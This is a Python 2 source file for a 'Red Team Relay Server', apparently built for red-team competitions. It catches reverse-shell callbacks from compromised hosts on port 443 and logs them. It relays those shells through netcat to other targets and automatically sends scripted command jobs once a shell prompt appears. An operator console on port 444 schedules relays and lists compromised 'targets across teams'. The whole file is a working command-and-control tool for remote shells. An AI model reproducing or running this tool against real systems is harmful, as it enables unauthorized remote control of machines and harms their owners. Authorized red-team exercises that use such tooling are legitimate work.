#!/usr/bin/python2

from twisted.internet.protocol import Factory
from twisted.protocols.basic import LineReceiver
from twisted.conch import recvline
from twisted.internet import reactor, protocol, defer
from os.path import isfile, join
import pdb, datetime, re, os, stat

LISTEN_PORT = 443  # Your callbacks should be sent here
COMMAND_PORT = 444 # Port to interact with server
NETCAT = '/bin/nc'
PROMPT = r'# $' #default shell prompt

class Listener(LineReceiver):

    def __init__(self, hosts, sched, conn, jobs):
        self.hosts = hosts  # List of called in hosts    [host, time]
        self.sched = sched  # List of scheduled relays   [host, target, port, count]
        self.conn = conn    # List of established relays [host, target, port, netcat_instance]
        self.jobs = jobs    # List of scheduled jobs     [host, job, prompt, count]
        self.nc = None
        self.job = None

    def connectionMade(self):
        host = self.transport.getPeer().host
        print "Connected: ", host

        for record in self.hosts: # Remove old record of last call-in if this one is new
            if host in record:
                self.hosts.remove(record)

        self.hosts.append([host, datetime.datetime.now()]) # Add record of call-in with ip and time

        if self.sched:
            for record in self.sched:
                shost, target, port, count = record
                if shost == host: # We got a relay to setup
                    cmd = [NETCAT, target, port]
                    cwd = '/tmp'

                    self.nc = ProcessProtocol(self, [host, target])
                    reactor.spawnProcess(self.nc, cmd[0], cmd, {}, cwd)
                    self.conn.append([host, target, port, self.nc])

                    if count == 1:
                        self.sched.remove(record)
                    if count >= 1:
                        record[3] -= 1

        if self.jobs:
            for shost, job, p, c in self.jobs:
                if shost == host:
                    self.job = 1

        #Kill it if we got nothing for the callback
        if not self.job and not self.nc:
            self.transport.loseConnection()

    def dataReceived(self, data):
        if self.nc != None:
            self.nc.transport.write(data)
            self.nc.log.write(data) #TODO Handle exceptions here
            self.nc.log.flush()

        if self.jobs:
            for host, target, port, nc in self.conn:
                if host == self.transport.getPeer().host:
                    return # Don't muck with established connections.
            for job in self.jobs:
                shost, filename, prompt, count = job
                if shost == self.transport.getPeer().host:
                    if re.search(prompt, data): # Found prompt. Lets start sending our job over.
                        with open(os.getcwd() + "/jobs/" + filename) as jobfile:
                            for line in jobfile.readlines():
                                self.sendLine(line)
                        print "Completed " + filename
                        self.transport.loseConnection()
                        if count == 1:
                            self.jobs.remove(job)
                        if count > 1:
                            job[3] -= 1

    def connectionLost(self, reason):
        if self.nc != None:
            self.nc.transport.loseConnection()
            self.nc.log.close()

class ProcessProtocol(protocol.ProcessProtocol):

    def __init__(self, nc, conn):
        self.nc = nc
        host, target = conn
        self.log = open(os.getcwd() + "/sessions/" + host + "--" + target, "a") #TODO: Handle exception

    def outReceived(self, data):
        self.nc.transport.write(data)
        self.log.write(data)
        self.log.flush()

    def processEnded(self, reason):
        if self.nc.conn:
            for record in self.nc.conn:
                if self.nc.transport.getPeer().host == record[0]:
                    self.nc.conn.remove(record)

        self.nc.transport.loseConnection()
        self.log.close()

class ListenerFactory(Factory):

    def __init__(self):
        self.hosts = []
        self.sched = []
        self.conn = []
        self.jobs = []

    def buildProtocol(self, addr):
        return Listener(self.hosts, self.sched, self.conn, self.jobs)

class Control(recvline.HistoricRecvLine):
    def __init__(self, listener):
        self.listener = listener
        self.tap = []
        self.state = "INPUT"
        self.name = "--- Red Team Relay Server ---\nListening on Port: " + str(LISTEN_PORT) + "\n\n"

    def connectionMade(self):
        self.terminal.write(self.name + "> ") #show prompt
        #print "Got a connection from: " + self.transport.getPeer.host()

    def dataReceived(self, line):
        if self.state == "INPUT":
            self.handle_input(line)

    def handle_input(self, line):
        cmd = line.split()[0]
        relay_m = re.search(r'(([0-9]{1,3}\.){3}[0-9]{1,3} ){2}[0-9]{1,5}(.*?)$', line)
        show_m = re.search(r'(relay|job)', line)

        if cmd == "show":
            if show_m:
                if show_m.group(1) == "relay":
                    for host, target, port, count in listener.sched:
                        self.terminal.write(host + " > " + target + ":" + port + "\n")
            else:
                if listener.hosts:
                    teams = []
                    for host, date in listener.hosts:
                        m = re.search(r'[0-9]{1,3}\.[0-9]{1,3}\.([0-9]{1,3})\.[0-9]{1,3}', host)
                        if m.group(1): teams.append(m.group(1))
                    
                    self.terminal.write(str(len(listener.hosts)) + " targets across " + str(len(set(teams))) + " teams:\n")
                    for host, date in listener.hosts:
                        self.terminal.write(str(host) + "," + date.strftime("%I:%M%p") + "\n")
                else:
                    self.terminal.write("No Connections\n")
				
        #Add relays with support for additional options
        elif cmd == "add" and relay_m:
            if relay_m.group(relay_m.lastindex) == "":
                c, host, target, port = line.split() 
                listener.sched.append([host, target, port, 1])

        elif cmd == "help":
            self.terminal.write("Just 'show' and 'add' commands at the moment.\nadd <target> <host> <port>\n\nex. 'show' or 'show relay'\nex. 'add 172.25.20.11 10.0.0.101 53'")
        else:
            self.terminal.write("huh?\n")

        self.terminal.write("\n> ")

class ControlFactory(Factory):
    def __init__(self, listener):
        self.listener = listener

    def buildProtocol(self, addr):
        return Control(self.listener)

listener = ListenerFactory()
reactor.listenTCP(LISTEN_PORT, listener)
reactor.listenTCP(COMMAND_PORT, ControlFactory(listener))
reactor.run()
